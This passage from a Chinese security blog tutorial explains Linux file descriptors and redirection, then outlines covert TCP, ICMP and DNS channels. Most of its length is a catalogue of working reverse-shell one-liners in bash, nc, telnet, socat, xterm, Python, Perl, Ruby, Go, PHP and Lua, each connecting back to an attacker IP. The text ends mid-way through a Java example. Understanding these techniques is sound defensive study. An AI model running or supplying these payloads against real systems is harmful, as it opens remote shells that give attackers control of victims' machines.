title="注意："></a><strong>注意：</strong></h3><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p><p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p><p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p><h3 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2. 重定向"></a>2. 重定向</h3><p>重定向主要分为两种</p><ul><li>输入重定向<ul><li>“&lt;”</li><li>“&lt;&lt;”</li></ul></li><li>输出重定向<ul><li>“&gt;”</li><li>“&gt;&gt;”</li></ul></li></ul><p><strong>重点：</strong></p><p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p><p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p><p>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p><p>4.<strong>再强调一下，重定向就是针对文件描述符的操作</strong></p><h4 id="2-1-输入重定向"><a href="#2-1-输入重定向" class="headerlink" title="2.1.输入重定向"></a><strong>2.1.输入重定向</strong></h4><p>格式： [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d749a4e2-9c80-1.png"><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110352181-1114204290.png" alt="img"></a></p><p>](<a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d7566fc4-9c80-1.png">https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d7566fc4-9c80-1.png</a>)</p><p>解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(<strong>有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入</strong>)</p><p>图示:</p><p>[<a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d763ff72-9c80-1.png"><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110751434-1161244658.png" alt="img"></a></p><h4 id="2-2-输出重定向"><a href="#2-2-输出重定向" class="headerlink" title="2.2.输出重定向"></a><strong>2.2.输出重定向</strong></h4><p>格式： [n]&gt; word</p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110913956-79867805.png" alt="img"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d77f7b1c-9c80-1.png">https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d77f7b1c-9c80-1.png</a>)</p><p>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</p><p>图示：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d79014c2-9c80-1.png"><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111019277-654958095.png" alt="img"></a></p><h4 id="2-3-标准输出与标准错误输出重定向"><a href="#2-3-标准输出与标准错误输出重定向" class="headerlink" title="2.3.标准输出与标准错误输出重定向"></a><strong>2.3.标准输出与标准错误输出重定向</strong></h4><p>格式： &amp;&gt; word &gt;&amp; word</p><p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d79df60a-9c80-1.png"><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111747902-1023189028.png" alt="img"></a></p><p>解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。</p><p>图示：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7abf9e4-9c80-1.png"><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111821295-137624665.png" alt="img"></a></p><h4 id="2-4-文件描述符的复制"><a href="#2-4-文件描述符的复制" class="headerlink" title="2.4.文件描述符的复制"></a><strong>2.4.文件描述符的复制</strong></h4><p>格式： [n]&lt;&amp;[m] &#x2F; [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读&#x2F;写方式打开对其没有任何影响）</strong></p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p><p><strong>重点：</strong></p><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p><p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p><p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p><p><strong>1.首先解析器解析到 2&gt;&amp;1</strong></p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113307927-498723848.png" alt="img"></p><p><strong>2.解析器再向后解析到 “&gt;”</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7cdb7be-9c80-1.png"><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113402709-148725631.png" alt="img"></a></p><h4 id="2-5-exec-绑定重定向"><a href="#2-5-exec-绑定重定向" class="headerlink" title="2.5.exec 绑定重定向"></a><strong>2.5.exec 绑定重定向</strong></h4><p>格式：exec [n] &lt;&#x2F;&gt; file&#x2F;[n]</p><p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><p><strong>重点：</strong></p><p>格式： [n]&lt;&gt;word</p><p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114049434-1826483874.png" alt="img"></p><p>​                                                             <img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114254852-1959897938.png" alt="img"></p><h2 id="0x2：通过建立socket-tcp连接实现网络通信【4层协议】"><a href="#0x2：通过建立socket-tcp连接实现网络通信【4层协议】" class="headerlink" title="0x2：通过建立socket tcp连接实现网络通信【4层协议】"></a>0x2：通过建立socket tcp连接实现网络通信【4层协议】</h2><h2 id="0x3：使用ICMP实现网络通信【4层协议】"><a href="#0x3：使用ICMP实现网络通信【4层协议】" class="headerlink" title="0x3：使用ICMP实现网络通信【4层协议】"></a>0x3：使用ICMP实现网络通信【4层协议】</h2><p><strong>ICMP隐蔽隧道的原理，改变操作系统默认填充的Data，替换成我们自己的数据。</strong><br>比如使用icmp隧道可以构造一个包含有<a href="http://www.facebook.com字符串的自定义data的包，如下图所示：">www.facebook.com字符串的自定义data的包，如下图所示：</a></p><p><img src="https://blog.riskivy.com/wp-content/uploads/2019/04/p5.png" alt="图片名称"></p><h2 id="0x4：使用DNS实现网络通信【7层协议】"><a href="#0x4：使用DNS实现网络通信【7层协议】" class="headerlink" title="0x4：使用DNS实现网络通信【7层协议】"></a>0x4：使用DNS实现网络通信【7层协议】</h2><ul><li>dns（udp直连模式）<ul><li>control server将指令封装成dns包格式，通过udp53直接发送给client</li><li>victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server</li></ul></li><li>dns（authoritative DNS server转发模式）<ul><li>victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上</li><li>control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。</li></ul></li></ul><h1 id="3-命令执行（system-executor）方式讨论"><a href="#3-命令执行（system-executor）方式讨论" class="headerlink" title="3. 命令执行（system executor）方式讨论"></a>3. 命令执行（system executor）方式讨论</h1><h2 id="0x1：通过管道符传递指令"><a href="#0x1：通过管道符传递指令" class="headerlink" title="0x1：通过管道符传递指令"></a>0x1：通过管道符传递指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello&quot;</span> | <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><h2 id="0x2：通过调用glibc-api执行系统指令"><a href="#0x2：通过调用glibc-api执行系统指令" class="headerlink" title="0x2：通过调用glibc api执行系统指令"></a>0x2：通过调用glibc api执行系统指令</h2><p>本质上来说，Linux系统中的ring3应用程序启动时都会加载glibc.so库，glibc库中对Linux系统调用实现了封装。应用程序可以像使用C库那样，安全地使用系统调用。</p><h2 id="0x3：通过直接调用系统调用执行指令"><a href="#0x3：通过直接调用系统调用执行指令" class="headerlink" title="0x3：通过直接调用系统调用执行指令"></a>0x3：通过直接调用系统调用执行指令</h2><p>一般来说，应用程序可以通过glibc封装出的接口来使用系统调用，这样避免一些锁、传参检查等问题。但是技术上，应用程序完全也可以绕过glibc，直接发起syscall系统调用。</p><h1 id="4-反弹Shell攻击组合方式讨论"><a href="#4-反弹Shell攻击组合方式讨论" class="headerlink" title="4. 反弹Shell攻击组合方式讨论"></a>4. 反弹Shell攻击组合方式讨论</h1><p>有了之前对命令执行和网络通信方式底层原理的讨论之后，这一章开始，我们将其进行横向和纵向的组合，讨论具体的反弹Shell姿势，并对每种姿势的底层原理进行分析。</p><h2 id="0x1：“重定向符”-”-x2F-dev-x2F-tcp网络通信”Bash反弹Shell"><a href="#0x1：“重定向符”-”-x2F-dev-x2F-tcp网络通信”Bash反弹Shell" class="headerlink" title="0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell"></a>0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell</h2><p>这一类反弹shell的本质是把bash&#x2F;zsh等进程的 0 1 2 输入输出重定向到远程socket，由socket中获取输入，重定向 标准输出（1）和错误输出（2）到socket。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">attacker</span>机器上执行：<br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">2333</span><br><br><span class="hljs-attribute">victim</span> 机器上执行：<br><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.146.129</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>“bash -i”：bash 是linux的一个比较常见的shell，除此之外还有 sh、zsh、等，他们之间有着细小差别</li><li>“-i”：这个参数表示的是产生交互式的shell</li><li>“&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port”：&#x2F;dev&#x2F;tcp|udp&#x2F;ip&#x2F;port 这个文件可以将其看成一个设备（Linux下一切皆文件），对这个文件进行读写，就能实现与监听端口的服务器的socket通信</li><li>”&gt;&amp;“：混合输出（错误、正确输出都输出到一个地方），避免受害者机器上依然能看到我们在攻击者机器中执行的指令</li><li>0&gt;&amp;1：输入0是由 &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到 &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 上，这就形成了一个回路，实现了我们远程交互式shell 的功能<ul><li><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215091731268-1852930532.png" alt="img"></li></ul></li></ul><p>常见的变种命令行如下：</p><ul><li><p>方式一：显式用“2&gt;&amp;1”来对错误输出进行重定向 </p><ul><li>bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1 2&gt;&amp;1</li></ul></li><li><p>方式二：唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别</p><ul><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</li><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</li></ul></li><li><p>方式三：</p><ul><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 &lt;&amp;2</li><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;2</li><li><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215093600154-402836042.png" alt="img"></li></ul></li><li><p>方式四：</p><ul><li>exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done<ul><li>“exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333”：这一句将文件描述符5重定向到了 &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 并且方式是读写方式，于是我们就能通过文件描述符对这个socket连接进行操作了</li><li>“command|while read line do …..done”：从文件中依次读取每一行，将其赋值给 line 变量（这里变量可以很多，以空格分隔），之后再在循环中对line进行操作。</li><li>”&gt;&amp;5 2&gt;&amp;1“：使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能</li></ul></li><li>0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</li></ul></li><li><p>方式五：</p><ul><li>rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;&#x2F;tmp&#x2F;f<ul><li>“mkfifo”：首先创建了一个管道</li><li>“cat”：将管道里面的内容输出传递给&#x2F;bin&#x2F;sh</li><li>“&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc …. &gt; &#x2F;tmp&#x2F;f”：sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</li></ul></li><li>mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</li></ul></li></ul><h2 id="0x2：第三方软件内置“socket通信”-“指令交互”实现反弹shel功能"><a href="#0x2：第三方软件内置“socket通信”-“指令交互”实现反弹shel功能" class="headerlink" title="0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能"></a>0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能</h2><p>第三方软件可以通过编译性或者解释性语言，在内部实现系统命中的调用执行以及网络双向通信的功能。理论上说，这类方式的变化是无限的。</p><h3 id="1-nc"><a href="#1-nc" class="headerlink" title="1. nc"></a>1. nc</h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -e /bin/sh <span class="hljs-number">192.168.146.129</span> <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><h3 id="2-telnet反弹shell"><a href="#2-telnet反弹shell" class="headerlink" title="2. telnet反弹shell"></a>2. telnet反弹shell</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mknod a p<span class="hljs-comment">; telnet 10.211.55.2 7777 0&lt;a | /bin/bash 1&gt;a</span><br>telnet <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">6666</span> | /bin/bash | telnet <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><h3 id="3-socat反弹shell"><a href="#3-socat反弹shell" class="headerlink" title="3. socat反弹shell"></a>3. socat反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监听命令</span><br>socat file:`<span class="hljs-built_in">tty</span>`,raw,<span class="hljs-built_in">echo</span>=0 tcp-listen:9999<br><br><span class="hljs-comment"># 反弹命令</span><br>socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999<br></code></pre></td></tr></table></figure><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215201848293-652984613.png" alt="img"> </p><h3 id="4-Xterm"><a href="#4-Xterm" class="headerlink" title="4. Xterm"></a>4. Xterm</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 在主控端配置</span><br><span class="hljs-comment"># 开启Xserver：　　# TCP 6001</span><br>Xnest :<span class="hljs-number">1</span>                <br><br><span class="hljs-comment"># 授予目标机连回来的权限：</span><br>xterm -<span class="hljs-keyword">display </span><span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">1</span>          <span class="hljs-comment"># Run this OUTSIDE the Xnest, another tab</span><br>xhost +targetip                         <span class="hljs-comment"># Run this INSIDE the spawned xterm on the open X Server</span><br><span class="hljs-comment"># 如果想让任何人都连上：</span><br>xhost +                      <br><br><span class="hljs-comment"># 在受控端执行</span><br><span class="hljs-comment"># 假设xterm已安装，连回你的Xserver：</span><br>xterm -<span class="hljs-keyword">display </span>attackerip:<span class="hljs-number">1</span><br>或者：<br>$ <span class="hljs-keyword">DISPLAY=attackerip:0 </span>xterm<br></code></pre></td></tr></table></figure><h2 id="0x3：“管道符”-“socket网络通信”实现bash反弹shell"><a href="#0x3：“管道符”-“socket网络通信”实现bash反弹shell" class="headerlink" title="0x3：“管道符”+ “socket网络通信”实现bash反弹shell"></a>0x3：“管道符”+ “socket网络通信”实现bash反弹shell</h2><h3 id="1-基于匿名管道（pipe）传递指令流"><a href="#1-基于匿名管道（pipe）传递指令流" class="headerlink" title="1. 基于匿名管道（pipe）传递指令流"></a>1. 基于匿名管道（pipe）传递指令流</h3><p>匿名管道（pipe）是内核中的一个单向数据通道，管道有一个读端和一个写端。一般用于父子进程之间的通信。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># client</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.43.146</span> <span class="hljs-number">7777</span> | /bin/bash | nc <span class="hljs-number">192.168.43.146</span> <span class="hljs-number">8888</span><br><span class="hljs-comment"># server</span><br><span class="hljs-attribute">ncat</span> -lvvp <span class="hljs-number">7777</span><br><span class="hljs-comment"># server </span><br><span class="hljs-attribute">ncat</span> -lvvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104646111-1137243959.png" alt="img"></p><p>bash进程的输入输出都来自其他进程的pipe。</p><h3 id="2-基于命名管道（fifo）"><a href="#2-基于命名管道（fifo）" class="headerlink" title="2. 基于命名管道（fifo）"></a>2. 基于命名管道（fifo）</h3><p>fifo是命名管道也被称为FIFO文件，它是一种特殊类型的文件，它在文件系统中以文件名的形式存在（因为多个进程要识别），它的行为和匿名管道类似（一端读一端写），但是FIFO文件也不在磁盘进行存储。一般用于进程间的通信。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">110.211</span>.<span class="hljs-number">55.2</span> <span class="hljs-number">7777</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure><ul><li>mkfifo 命令首先创建了一个管道</li><li>cat 将管道里面的内容输出传递给&#x2F;bin&#x2F;sh</li><li>sh会执行管道里的命令并将标准输出和标准错误输出结果通过 nc 传到该管道，由此形成了一个回路</li></ul><h2 id="0x4：git解释性脚本语言反弹shell"><a href="#0x4：git解释性脚本语言反弹shell" class="headerlink" title="0x4：git解释性脚本语言反弹shell"></a>0x4：git解释性脚本语言反弹shell</h2><h3 id="1-python反弹shell"><a href="#1-python反弹shell" class="headerlink" title="1. python反弹shell"></a>1. python反弹shell</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">python -c <span class="hljs-string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br><br><span class="hljs-comment"># 拆成多行方便阅读</span><br>import os,<span class="hljs-built_in">socket</span>,subprocess<br>s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&#x27;ip&#x27;</span>,port))<br>os.dup2(s.fileno(),<span class="hljs-number">0</span>)<br>os.dup2(s.fileno(),<span class="hljs-number">1</span>)<br>os.dup2(s.fileno(),<span class="hljs-number">2</span>)<br>p=subprocess.call([<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-i&#x27;</span>])<br></code></pre></td></tr></table></figure><ul><li>使用duo2方法将第二个形参（文件描述符）指向第一个形参（socket链接）<ul><li>os.dup2(s.fileno(),0)</li><li>os.dup2(s.fileno(),1)</li><li>os.dup2(s.fileno(),2)</li></ul></li><li>使用os的subprocess在本地开启一个子进程，启动bash交互模式，标准输入、标准输出、标准错误输出被重定向到了远程</li></ul><h3 id="2-perl反弹shell"><a href="#2-perl反弹shell" class="headerlink" title="2. perl反弹shell"></a>2. perl反弹shell</h3><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=”<span class="hljs-number">10.211</span><span class="hljs-number">.55</span><span class="hljs-number">.2</span><span class="hljs-string">&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;</span>tcp<span class="hljs-string">&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;</span>&gt;&amp;S<span class="hljs-string">&quot;);open(STDOUT,&quot;</span>&gt;&amp;S<span class="hljs-string">&quot;);open(STDERR,&quot;</span>&gt;&amp;S<span class="hljs-string">&quot;);exec(&quot;</span>/bin/sh -i<span class="hljs-string">&quot;);&#125;;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 拆成多行方便阅读</span><br><span class="hljs-string">use Socket</span><br><span class="hljs-string">$i=”10.211.55.2&quot;</span><br><span class="hljs-variable">$p</span>=<span class="hljs-number">7777</span><br><span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>))<br><span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<br>    <span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>)<br>    <span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>)<br>    <span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>)<br>    <span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-ruby反弹shell"><a href="#3-ruby反弹shell" class="headerlink" title="3. ruby反弹shell"></a>3. ruby反弹shell</h3><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">ruby <span class="hljs-operator">-</span>rsocket <span class="hljs-operator">-</span>e&#x27;f<span class="hljs-operator">=</span>TCPSocket.<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;10.0.0.1&quot;</span>,<span class="hljs-number">1234</span>).to_i;exec <span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)’<br></code></pre></td></tr></table></figure><h3 id="4-go反弹shell"><a href="#4-go反弹shell" class="headerlink" title="4. go反弹shell"></a>4. go反弹shell</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">echo &#x27;package main;import<span class="hljs-string">&quot;os/exec&quot;</span>;import<span class="hljs-string">&quot;net&quot;</span>;func main()&#123;c,<span class="hljs-symbol">_</span>:=net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>,<span class="hljs-string">&quot;192.168.0.134:8080&quot;</span>);cmd:=exec.Command(<span class="hljs-string">&quot;/bin/sh&quot;</span>);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27; &gt; /tmp/t.<span class="hljs-built_in">go</span> &amp;&amp; <span class="hljs-built_in">go</span> run /tmp/t.<span class="hljs-built_in">go</span> &amp;&amp; rm /tmp/t.<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure><h4 id="5-php反弹shell"><a href="#5-php反弹shell" class="headerlink" title="5. php反弹shell"></a>5. php反弹shell</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">php –r  <span class="hljs-symbol">&#x27;exec</span>(<span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777&quot;</span>)’<br></code></pre></td></tr></table></figure><h3 id="6-lua反弹shell"><a href="#6-lua反弹shell" class="headerlink" title="6. lua反弹shell"></a>6. lua反弹shell</h3><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">lua -e &quot;require(<span class="hljs-string">&#x27;socket&#x27;</span>);require(<span class="hljs-string">&#x27;os&#x27;</span>);t=socket.tcp();t:connect(<span class="hljs-string">&#x27;10.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;1234&#x27;</span>);os.execute(<span class="hljs-string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>);&quot;<br></code></pre></td></tr></table></figure><h3 id="7-java"><a href="#7-java" class="headerlink" title="7. java"></a>7. java</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r = Runtime<span class="hljs-selector-class">.getRuntime</span>()<br><span class="hljs-selector-tag">p</span> = r<span class="hljs-selector-class">.exec</span>(<span class="hljs-selector-attr">[<span 